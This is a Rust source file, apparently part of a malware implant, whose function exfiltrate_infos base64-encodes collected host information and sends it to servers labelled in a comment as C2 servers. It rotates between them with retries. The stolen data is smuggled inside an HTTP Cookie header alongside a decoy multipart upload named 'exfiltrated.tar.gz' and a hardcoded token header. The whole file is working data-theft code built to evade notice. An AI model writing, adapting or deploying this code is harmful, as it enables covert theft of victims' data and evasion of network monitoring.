use base64::{engine::general_purpose, Engine as _};
use std::collections::HashMap;
use reqwest::blocking::multipart::{Form, Part};
pub fn exfiltrate_infos(infos: HashMap<String, String>) -> Result<(), &'static str> {
    // serialize the hashmap and base64 it
    let serialized_infos =
        general_purpose::STANDARD_NO_PAD.encode(serde_json::to_string(&infos).unwrap());
    let servers = vec!["http://127.0.0.1:80/upload.php", "http://127.0.0.1:8001"]; // C2 servers
    let mut curr_try = 0;
    let mut fail_count = 0;
    loop {
        // send the serialized infos to the server
        println!("{:?}", serialized_infos.clone());
        match send_as_text(servers[curr_try], &serialized_infos) {
            Ok(_) => {
                println!("Successfully sent the infos to the server");
                break;
            }
            Err(_) => {
                fail_count += 1;
                if fail_count == servers.len() {
                    return Err("All servers failed");
                }
                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        }
        curr_try = (curr_try + 1) % servers.len();
    }
    Ok(())
}
pub fn send_as_text(url: &str, data: &String) -> Result<reqwest::blocking::Response, reqwest::Error> {
    let file_name = "exfiltrated.tar.gz";
    let file_contents: Vec<u8> = vec![0; 1024];
    let form = Form::new()
    .part("file", Part::bytes(file_contents)
    .file_name(file_name));
    // create the client object
    let client = reqwest::blocking::Client::new();
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert("token", reqwest::header::HeaderValue::from_str("FiT4bNJ4U6R==XwkOomwZrytTasZA7ujpUFFFa19Mc9gb3BERrzrxLUFKcp1Wn5?p5d3Hhoo/B0m8y6q=zPmojQ9dV6jT9bIYf57/uA7-f/LnZw7NtC9dCjr!l8dm-Pv").unwrap());
    headers.append(reqwest::header::COOKIE, reqwest::header::HeaderValue::from_str(data).unwrap());
    let res = client.post(url)
    .headers(headers)
    .multipart(form)
    .send();
    println!("Result: {:?}", res);
    return res
}